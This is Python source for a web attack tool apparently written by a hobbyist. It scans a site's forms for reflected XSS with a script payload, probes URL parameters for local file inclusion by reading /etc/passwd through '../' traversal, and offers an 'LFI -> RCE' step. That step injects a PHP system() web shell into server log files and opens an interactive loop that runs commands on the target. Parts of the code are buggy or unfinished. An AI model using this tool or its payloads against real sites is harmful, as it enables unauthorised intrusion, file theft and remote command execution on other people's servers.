"""
Rennaarenata made this (shitty and obsolete) tool.
RCE & Code injection (LFI -> RCE) part was made by t0rt3ll1n0 (his github here: https://github.com/t0rt3ll1n0), thank you sm tortellino ^^

Enjoy this tool :D

"""


# ---------------------------------- #
import requests
import os
import sys
import time
import argparse
# ----------------------------------- #
from bs4 import BeautifulSoup as bsp
from random import choice, randint
from urllib.parse import urljoin, urlparse
from pprint import pprint
from colorama import Fore, Style
from asciistuff import Banner, Lolcat
from user_agent import generate_user_agent
# ----------------------------------- #   XSS 
a = """
@@@  @@@  @@@  @@@  @@@       @@@  @@@  @@@@@@@@  @@@@@@@    @@@@@@   @@@@@@@     @@@  @@@         @@@  @@@@@@@  @@@  @@@@@@    @@@@@@      @@@@@@@   @@@@@@@     @@@  @@@       @@@       @@@@@@   @@@@@@@   
@@@  @@@  @@@  @@@  @@@       @@@@ @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@   @@@@  @@@        @@@@  @@@@@@@  @@@  @@@@@@@  @@@@@@@      @@@@@@@@  @@@@@@@@   @@@@  @@@       @@@       @@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@@  @@!       @@!@!@@@  @@!       @@!  @@@  @@!  @@@  @@!  @@@  @@@!!  @@!       @@@!!    @@!    @@!      @@@  !@@          @@!  @@@  @@!  @@@  @@@!!  @@!       @@!           @@@  @@!  @@@  
!@!  @!@  !@!  @!@  !@!       !@!!@!@!  !@!       !@!  @!@  !@!  @!@  !@   @!@    !@!  !@!         !@!    !@!    !@!      @!@  !@!          !@!  @!@  !@!  @!@    !@!  !@!       !@!           @!@  !@!  @!@  
@!@  !@!  @!@  !@!  @!!       @!@ !!@!  @!!!:!    @!@!!@!   @!@!@!@!  @!@!@!@     @!@  @!!         @!@    @!!    !!@  @!@!!@   !!@@!!       @!@  !@!  @!@!!@!     @!@  @!!       @!!       @!@!!@   @!@!!@!   
!@!  !!!  !@!  !!!  !!!       !@!  !!!  !!!!!:    !!@!@!    !!!@!!!!  !!!@!!!!    !@!  !!!         !@!    !!!    !!!  !!@!@!    !!@!!!      !@!  !!!  !!@!@!      !@!  !!!       !!!       !!@!@!   !!@!@!    
:!:  !!:  !!:  !!!  !!:       !!:  !!!  !!:       !!: :!!   !!:  !!!  !!:  !!!    !!:  !!:         !!:    !!:    !!:      !!:       !:!     !!:  !!!  !!: :!!     !!:  !!:       !!:           !!:  !!: :!!   
 ::!!:!   :!:  !:!   :!:      :!:  !:!  :!:       :!:  !:!  :!:  !:!  :!:  !:!    :!:   :!:        :!:    :!:    :!:      :!:      !:!      :!:  !:!  :!:  !:!    :!:   :!:       :!:          :!:  :!:  !:!  
  ::::    ::::: ::   :: ::::   ::   ::   :: ::::  ::   :::  ::   :::   :: ::::    :::   :: ::::    :::     ::     ::  :: ::::  :::: ::       :::: ::  ::   :::    :::   :: ::::   :: ::::  :: ::::  ::   :::  
   :       : :  :   : :: : :  ::    :   : :: ::    :   : :   :   : :  :: : ::      ::  : :: : :     ::     :     :     : : :   :: : :       :: :  :    :   : :     ::  : :: : :  : :: : :   : : :    :   : :                                                                                                                                                                                                                                                                                                                                                        
 """
dirs = []
inputs = []
vulninput = []
ilinks = []
dlinks = []
slinks = []
slinks2 = []
links = []
vulnerableinputs = []
total_inputs = []
inputs_set = set(total_inputs)

def bye():
    msg9 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[^] Glad to help, bye!!")
    for char in msg9:
        time.sleep(0.04)
        sys.stdout.write(char)
        sys.stdout.flush()
    exit()

def asay(message):
    for char in message:
        time.sleep(0.04)
        sys.stdout.write(char)
        sys.stdout.flush()

def bannerh():
    if(sys.platform == "win32"):
        os.system("cls")
    if(sys.platform == "linux" or sys.platform == "linux2"):
        os.system("clear")

    print(Fore.BLUE + Style.BRIGHT + str(Lolcat(a)))

def find_dirs(site):
    try:
        useragent = generate_user_agent()
        headers = {
            "User-Agent": useragent
        }
        response = requests.get(site, headers=headers)
        content = response.text
        zuppa = bsp(content, "html5lib")
        scrape = zuppa.find_all("a")
        for i in scrape:
            try:
                if(i['href'][0] == '/' and i['href'][-1] == '/' and i['href'].startswith("//") == False and i['href'].endswith("//") == False):
                    dirs.append(i['href'])
                else:
                    pass
            except KeyError:
                pass
    except requests.exceptions.ConnectionError:
        pass

def link_parser(sites):
    try:
        user_agent = generate_user_agent()
        headers = {
            "User-Agent" : user_agent
        }
        response = requests.get(sites, headers=headers)
        content = response.text
        zuppapazza = bsp(content, "html5lib")
        scrape_links = zuppapazza.find_all("a")
        for i in scrape_links:
            try:
                if(sites in i['href']):
                    ilinks.append(i['href'])
                    pass
                if(i['href'][0] != '/' and i['href'][-1] == '/' and i['href'].startswith("https") == False and i['href'].startswith("http") == False):
                    slinks.append(i['href'])
                    pass
                if(i['href'].startswith("//") == False and i['href'][0] == "/" and i['href'][-1] != "/" and i['href'].startswith("http") == False and i['href'].startswith("https") == False and i['href'].startswith("www.") == False and i['href'].startswith("mailto") == False):
                    #as
                    links.append(i['href'])
                    pass
                if(i['href'].startswith("/") == False and i['href'].endswith("/") == False and i['href'].startswith("https") == False and i['href'].startswith("http") == False):
                    slinks2.append(i['href'])
                    pass
                else:
                    pass
            except KeyError:
                pass
    except requests.exceptions.ConnectionError:
        pass

def search_inputs_links():
	for link in links:
            try:
                user_agent = generate_user_agent()
                headers = {
                    "User-Agent" : user_agent
                }
                r = requests.get(str(site) + str(link), headers=headers)
                content = r.text
                soup = bsp(content, "html5lib")
                scrape_links = soup.find_all("input")
                for i in scrape_links:
                    try:
                        total_inputs.append(i['name'])
                        pass
                    except KeyError:
                        pass
            except requests.exceptions.ConnectionError:
                    pass

def getforms(sitem):
    zuppetta = bsp(requests.get(sitem).content, "html.parser")
    return zuppetta.find_all("form")

def details(forms):
    detailsf = {}
    
    action = forms.attrs.get("action")
    method = forms.attrs.get("method", "get").lower()    
    inputs = []

    for input_tag in forms.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    detailsf["action"] = action
    detailsf["method"] = method
    detailsf["inputs"] = inputs

    return detailsf

def submitf(form_details, url, val):
    
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if(input["type"] == "text" or input["type"] == "search"):
            input["value"] = val
        input_name = input.get("name")
        input_value = input.get("value")
        if(input_name and input_value):
            data[input_name] = input_value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scanx_links(url, jscrpt, swordstate, link):
    try:
        for input_set in inputs_set:
            user_agent = generate_user_agent()
            headers = {
                "User-Agent" : user_agent
            }
            contentT = requests.get(str(url) + str(link) + "?" + str(input_set) + "=" + str(jscrpt), headers=headers)
            content = contentT.text
            if(jscrpt in content):
                vulnerableinputs.append(input_set)
    except requests.exceptions.ConnectionError:
        pass

def scanx(url, jscrpt, swordstate, ismain):
  
    if(jscrpt == None):
        jscrpt = "<script>alert(1)</script>"
    isv = False
    for form in forms1:
        form_details = details(form)
        content = submitf(form_details, url, jscrpt).content.decode()
        if(jscrpt in content):
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[!!] GOOD NEWS BOI!" + Fore.BLUE + Style.BRIGHT + " XSS FOUND ON " + Fore.LIGHTGREEN_EX + Style.BRIGHT + f"{url}")
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[*]: Here you go, form details:\n " + Fore.RED + Style.BRIGHT)
                pprint(form_details)
                isv = True
                if(ismain == "Yes"):
                    ismain = "mainvuln"
                    return ismain
    return isv
# ------------------------------------ # XSS
parser = argparse.ArgumentParser(description="WebFlaws-Scanner made by Rennaarenata")
parser.add_argument("-u", "--site", help="The site to analyze and search for security flaws")
parser.add_argument("-c", "--custom", help="Use this option if you want to use a custom payload to test", default="<script>alert(1)</script>")
parser.add_argument("-wl", "--wordlist", help="Use this option if you want to use a wordlist of payloads to test", default=None)
parser.add_argument("-ws", "--swordlist", help="Use this option if you want to scan more then one site", default=None)
parser.add_argument("-m", "--mode", help="Choose whether the program should scan for XSS, RFI, SQLi or LFI vulnerabilities", default=None)

args = parser.parse_args()
site = args.site
mode = args.mode
custom = args.custom
wordlist = args.wordlist
swordlist = args.swordlist


# --------------------------------------- # Mode Check
if(mode == None):
    ms = ("[??] Define the -m (--mode) parameter :)")
    asay(message=ms)
    exit()

if(site == None and swordlist == None):
    msg100 = (Fore.RED + Style.BRIGHT + f"[??] Define a target please, you can choose it from a wordlist or define a single target...")
    asay(message=msg100)
    
# ------------------------------------ # XSS THINGS
if(mode == "XSS" or mode == "xss" or mode == "Xss"):
    if(swordlist == None):
        bannerh()
        
        fnntng = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Scanning " + Fore.MAGENTA + f"{site}" + Fore.LIGHTGREEN_EX)
        asay(message=fnntng)

        find_dirs(site=site)
        forms1 = getforms(sitem=site)
        
        mlgf = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[+] Found " + Fore.MAGENTA + Style.BRIGHT + f"{len(forms1)}" + Fore.LIGHTGREEN_EX + Style.BRIGHT +" form(s) in the main page..." + Fore.RED + Style.BRIGHT + "\n")
        asay(message=mlgf)
        
        print("\n=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
        for form in forms1:
            l = (f"\n{details(form)}")
            pprint(l)
            print("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")

        msg1 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[i] Searching for directories...")
        asay(message=msg1)

        ms2 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[+] Found " + Fore.MAGENTA + f"{str(len(dirs))}" + Fore.LIGHTGREEN_EX + " directories:")
        asay(message=ms2)
        for i in range(200):
            try:
                msg2 = (Fore.BLUE + Style.BRIGHT + f"\n>> {dirs[i]}")
                asay(message=msg2)
                
                if(i == 10):
                    a = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\n[??] Do you want to continue? (y/n): ")
                    if(a == 'y'):  
                        msg4 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[-] Ok...")   
                        asay(message=msg4)
                        continue
                    else:
                        msg4 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[-] Ok, let's go ahead...")
                        asay(message=msg4)
                        break
            except IndexError:
                pass
        
        zerodir = False

        msss = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[i] Searching for links...\n")
        asay(message=msss)

        link_parser(sites=site)
        search_inputs_links()
        s = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Found " + Fore.MAGENTA  + Style.BRIGHT + f"{len(total_inputs)}" + Fore.LIGHTGREEN_EX + Style.BRIGHT + " links...\n")
        asay(s)
        if(len(dirs) == 0):
            zerodir = True

        if(zerodir == False):
            msg5 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[i] Searching for forms in all directories...")
        else:
            msg5 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[i] Searching for forms in the main page...")

            asay(message=msg5)

        time.sleep(5)
        
        msg6 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[i] Testing the main page...")
        asay(message=msg6)

        l = False         

        if(scanx(site, custom, False, "Yes") == "mainvuln" and zerodir == False):
            msg7 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[??] Do you want to test directories? (y/n): ")
            asay(message=msg7)
            p = input()
            
            if(p == 'y'):
                pass 
            else:
                bye()
        
        if(zerodir == False):
            msg7 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[i] Testing all the directories...\n")
            asay(message=msg7)
        

        a = 0
        if(swordlist == None and wordlist == None):
            for i in range(int(len(dirs))):
                sitem = site + dirs[int(i)]
                forms = getforms(sitem=sitem)
                if(scanx(sitem, custom, False, "No") == False):
                    msg8 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[@] Nothing in \"{dirs[int(i)]}\" Try checking manually...")
                    asay(message=msg8)
        if(swordlist == None and wordlist != None):
            with open(wordlist, 'r') as f:
                find_dirs(site=site)
                for line in f:
                    for i in range(int(len(dirs))):
                        sitem = site + dirs[int(i)]
                        getforms(sitem=sitem)
                        if(scanx(sitem, line, False, "No") == False):
                            a+=1
                            msg8 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[@] Nothing in \"{sitem}\" Try checking manually... Payload {a} - {line}")
                            asay(message=msg8)
                            if(a % 5 == 0):
                                ss = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + "[??] Continue? (y/n): ")
                                if(ss == 'y'):
                                    continue
                                else:
                                    msg00 = (Fore.LIGHTGREEN_EX + Style.BRIGHT + "[-] Ok...")
                                    asay(message=msg00)
                                    bye()
        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\n[=] Nothing Here my guy...")
    if(swordlist != None):
        print
              # ...

# ----------------------------------------------------------- # LFI
def doit(whattotest, howdeeeep, deeparam, check):
    newstr = whattotest + (deeparam * howdeeeep) + check
    return newstr

def gensomething(lt):
    import string 
    import random 
    res = ''.join(random.choices(string.ascii_lowercase, k = lt)) 
    return str(res)

def checkforvuln(string):
    check1 = "root:x:0:0:"
    check2 = "mail:x:8:"
    cc = requests.get(string)
    content = cc.content.decode()
    if check1 in content or check2 in content:
        a = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[!!] LFI Vulnerability found on {string}, content:\n {content}\n[+] Creating a log file...")
        
        log = open("log.txt", 'w')
        log.write("[LFI FOUND]\n---------------------------------- Content\n" + content)
        log.close()
        print(a)
        time.sleep(4)
        aa = True
        return aa

if(mode == "LFI" or mode == "lfi" or mode == "Lfi"):
    bannerh()
    # variables
    nullbyte = "%00"
    max_file_depth = 20
    more_depthness = "../"
    user_agent = generate_user_agent()
    testfile = "/etc/passwd"
    check1 = "root:x:0:0:"
    check2 = "mail:x:8:"
    
    if(site.endswith('=') != True):
        ms = (Fore.LIGHTGREEN_EX + Style.BRIGHT + "[!] Please insert a valid url (e.g. https://www.site.com/file.php?parameter= or https://www.site.com/lol?something= )")
        asay(ms)
        exit()
    
    cc = ""
    statuscode = 0
    testthis = site + testfile
    cc = requests.get(testthis)
    content = cc.content.decode()
    statuscode = cc.status_code
    newstra = ""
    parsed = urlparse(testthis)

    msd = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[-] Analyzing" + Fore.MAGENTA + Style.BRIGHT +  f" {site} \n")
    asay(msd)
    
    if(statuscode == 500 or statuscode == 404 or statuscode == 503):
        for i in range(int(max_file_depth)):
                newstra = doit(testthis, i, more_depthness, check1)
                cc1 = requests.get(newstra)
                content1 = cc1.content.decode()

    if checkforvuln(testthis) == True:
        gf = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Do you want to exploit this LFI?[y/n] (LFI -> RCE): ")
        asay(gf)
        scelta = input()
        if scelta == "Y" or scelta == "y":
                gented = gensomething(6)
                php_shell = f"""<?php system($_GET['{gented}']); ?"""
                effe = open("logs.txt")
                logfiles  = effe.read().split()
                m = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[+] Starting log crawler against" + Fore.MAGENTA + Style.BRIGHT + f"{testthis}")
                asay(m)
                for logfile in logfiles:
                    lol = requests.get(testthis + logfile)
                    if lol.status_code == 200:
                        assdsa = (Fore.LIGHTGREEN_EX + Style.BRIGHT + f"[!] Nice, i found this log file:" + Fore.MAGENTA + Style.BRIGHT + f"{logfile}")
                        asay(assdsa)
                        lok = (Fore.LIGHTGREEN_EX + Style.BRIGHT + "\n[+] Now i will inject some php code into the log file to trigger RCE\n")
                        asay(lok)
                        rce = requests.get(testthis + php_shell)
                        succ = (Fore.RED + Style.BRIGHT + f"[!] Code injected successfully (rce parameter {gented})\n")
                        while True:
                            cmd = input(Fore.LIGHTBLUE_EX + Style.BRIGHT + "Enter a command to execute:\n>> ")
                            file = randint(0, 1000000)
                            codexec = requests.get(testthis + logfile + "?asd=" + cmd + "> /tmp/" + str(file) + ".txt")
                            output = requests.get(testthis + "../../../../../../../../tmp/" + str(file) + ".txt")
                            postpt = (Fore.LIGHTBLUE_EX + Style.BRIGHT + f"Possible command output: \n{output.text}")
                            asay(postpt)
                    else:
                        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + f"[@] I didn't found any injectable log file...\n[@] Exiting...")
                        exit()
        elif scelta == "N" or scelta == "n":
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "[^]Glad to help, bye!!\n")
            exit(0)
 
